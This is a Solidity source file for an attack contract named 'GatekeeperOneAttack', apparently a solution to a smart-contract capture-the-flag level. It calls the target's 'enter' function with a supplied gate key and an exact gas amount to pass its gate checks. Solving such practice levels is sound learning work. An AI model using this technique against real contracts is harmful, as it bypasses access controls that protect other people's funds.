// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneAttack {
    GatekeeperOne gatekeeperOneContract;

    constructor(address _gatekeeperOneContract) public {
        gatekeeperOneContract = GatekeeperOne(_gatekeeperOneContract);
    }

    function attack(bytes8 _gateKey, uint256 _gasAmount) external {
        gatekeeperOneContract.enter{gas: _gasAmount}(_gateKey);
    }
}
